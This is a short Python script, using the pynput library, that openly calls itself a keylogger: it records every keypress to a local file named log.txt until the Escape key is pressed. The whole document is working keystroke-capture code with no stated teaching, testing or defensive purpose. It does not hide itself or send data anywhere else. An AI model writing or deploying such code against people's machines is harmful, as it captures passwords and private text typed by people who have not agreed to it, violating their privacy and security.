from pynput.keyboard import Key, Listener

def on_press(key):
    if key == Key.esc:
        return False
    try:
        with open('log.txt', 'a') as f:
            f.write(str(key) + '\n')
    except Exception as e:
        print(f"An error occurred: {e}")
with Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
print("Keylogger stopped.")